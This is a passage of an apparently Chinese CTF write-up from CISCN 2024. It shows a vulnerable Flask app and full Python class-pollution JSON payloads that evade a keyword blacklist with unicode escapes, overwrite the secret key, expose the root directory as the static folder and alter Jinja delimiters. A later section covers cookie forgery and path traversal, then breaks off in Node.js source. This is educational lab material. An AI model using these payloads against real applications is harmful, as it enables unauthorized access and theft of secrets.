class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Polluted"><a href="#Polluted" class="headerlink" title="Polluted"></a>Polluted</h1><h2 id="BREAK-2"><a href="#BREAK-2" class="headerlink" title="BREAK"></a>BREAK</h2><p>æ–©ä¸‹äºŒè¡€</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token keyword">import</span> os<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> json<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">generate_random_md5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    random_string <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>random_string<span class="token punctuation">)</span>    <span class="token keyword">return</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklisted_patterns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'init'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'string'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pattern <span class="token keyword">in</span> blacklisted_patterns<span class="token punctuation">:</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> user_input<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Recursive merge function</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> generate_random_md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username    session<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> password    Evil <span class="token operator">=</span> evil<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> Evil<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">templates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> username <span class="token keyword">and</span> password<span class="token punctuation">:</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">"adminer"</span> <span class="token keyword">and</span> password <span class="token operator">==</span> app<span class="token punctuation">.</span>secret_key<span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"important.html"</span><span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"rt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Hello,  This is the POLLUTED page.'</span></span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŸå‹é“¾æ±¡æŸ“</p><p>è¿‡æ»¤<code>&#39;init&#39;, &#39;global&#39;, &#39;env&#39;, &#39;app&#39;, &#39;_&#39;, &#39;string&#39;</code>ï¼Œç›´æ¥unicodeç»•è¿‡</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"adminer"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0061\u0070\u0070"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"secret\u005fkey"</span><span class="token operator">:</span><span class="token string">"114514"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åå°±æ±¡æŸ“äº†ï¼Œsessionæœ¬åœ°ç”Ÿæˆä¸€ä¸ªï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"adminer"</span>session<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"114514"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623100402510.png" alt="image-20240623100402510"></p><p>ç„¶åå¸¦è¿™ä¸ªcookieå»é¶æœº</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623100650218.png" alt="image-20240623100650218"></p><p>å—¯ï¼Ÿæˆ‘flagå‘¢ï¼Ÿ</p><p>é‚£å°±ç”¨ä¹‹å‰boogipopçš„éé¢„æœŸæ‰“æ³•ï¼Œæ±¡æŸ“é™æ€æ–‡ä»¶å¤¹ä½ç½®ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"adminer"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0061\u0070\u0070"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u005fstatic\u005ffolder"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åè®¿é—®ï¼š<code>/static/flag</code>å³å¯</p><p>é¢„æœŸè§£ï¼š<a href="https://www.cnblogs.com/gxngxngxn/p/18264279">https://www.cnblogs.com/gxngxngxn/p/18264279</a></p><p>æˆ‘ä»¬çŸ¥é“pythonçš„æ¨¡æ¿æ¸²æŸ“æ ‡è¯†ç¬¦ä¸€èˆ¬æ˜¯<code>&#123;&#123;&#125;&#125;</code>ï¼Œæ‰€ä»¥ä¸Šé¢è¾“å‡º<code>[%flag%]</code>æ˜¯å› ä¸ºæ²¡æ¸²æŸ“æˆåŠŸï¼Œéœ€è¦æ±¡æŸ“jinja2çš„è¯­æ³•æ ‡è¯†ç¬¦ä¸º<code>[%%]</code></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span> <span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"app"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"jinja_env"</span> <span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"variable_start_string"</span> <span class="token operator">:</span> <span class="token string">"[%"</span><span class="token punctuation">,</span><span class="token property">"variable_end_string"</span><span class="token operator">:</span><span class="token string">"%]"</span> <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="FIX-2"><a href="#FIX-2" class="headerlink" title="FIX"></a>FIX</h2><p>ç»§ç»­åŠ å·²ç»æœ‰çš„é»‘åå•å°±è¡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token keyword">import</span> os<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> json<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">generate_random_md5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    random_string <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>random_string<span class="token punctuation">)</span>    <span class="token keyword">return</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklisted_patterns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'init'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'string'</span><span class="token punctuation">,</span><span class="token string">'secret'</span><span class="token punctuation">,</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">'static'</span><span class="token punctuation">,</span><span class="token string">'folder'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pattern <span class="token keyword">in</span> blacklisted_patterns<span class="token punctuation">:</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> user_input<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Recursive merge function</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> generate_random_md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username    session<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> password    Evil <span class="token operator">=</span> evil<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> Evil<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">templates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> username <span class="token keyword">and</span> password<span class="token punctuation">:</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">"adminer"</span> <span class="token keyword">and</span> password <span class="token operator">==</span> app<span class="token punctuation">.</span>secret_key<span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"important.html"</span><span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"rt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Hello,  This is the POLLUTED page.'</span></span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="bigfish"><a href="#bigfish" class="headerlink" title="bigfish"></a>bigfish</h1><h2 id="BREAK-3"><a href="#BREAK-3" class="headerlink" title="BREAK"></a>BREAK</h2><p>è®¿é—®adminè·¯ç”±çš„æ—¶å€™å‘ç°å‡ºç°äº†<code>set-cookie</code>ï¼Œç»™äº†ä¸¤ä¸ªcookieï¼š<code>is_admin=false</code>å’Œ<code>username</code></p><p>å°è¯•ä¿®æ”¹åä¼ å…¥adminè·¯ç”±</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623122451012.png" alt="image-20240623122451012"></p><p>æˆåŠŸè®¿é—®</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623122644430.png" alt="image-20240623122644430"></p><p>çŒœæµ‹QQç®¡ç†å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œæ”¹å­˜å‚¨ä½ç½®ä¸ºfish.jsï¼Œå‘ç°å¯ä»¥è¯»åˆ°</p><p>æµ‹è¯•å‘ç°å¯ä»¥ç›®å½•ç©¿è¶Šï¼Œç¿»äº†ä¸€ä¸‹ç¯å¢ƒå˜é‡å‘ç°æ²¡flagï¼Œè¿˜æ˜¯è€è€å®å®å®¡ä»£ç å§ï¼ˆ</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> serialize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> schedule <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-schedule'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Change working directory to /srv</span>process<span class="token punctuation">.</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'/srv'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> rule1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">schedule<span class="token punctuation">.</span>RecurrenceRule</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>rule1<span class="token punctuation">.</span>minute <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token 